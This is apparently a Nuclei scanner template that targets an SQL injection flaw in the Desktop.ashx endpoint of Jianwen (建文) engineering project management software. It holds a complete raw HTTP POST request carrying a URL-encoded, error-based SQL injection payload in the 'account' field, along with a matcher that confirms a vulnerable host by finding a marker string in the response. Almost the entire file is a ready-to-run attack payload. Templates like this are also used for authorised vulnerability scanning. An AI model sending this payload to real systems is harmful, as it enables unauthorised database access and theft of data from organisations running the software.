id: jwgc-desltop-sqli

info:
  name: jwgc-desltop-sqli
  author: HB
  severity: high
  description: 建文工程项目管理软件Desktop存在SQL注入漏洞

http:
  - raw:
    - |
      POST /SysFrame4/Desktop.ashx HTTP/1.1
      Host: 
      Content-Type: application/x-www-form-urlencoded
      Accept-Encoding: gzip
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      
      account=1%27+AND+8607+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%288607%3D8607%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29-- RvNO&method=isChangePwd&pwd=

    matchers:
     - type: dsl
       dsl:
        - 'status_code==200 && contains_all(body,"qjjxq1qbjkq")'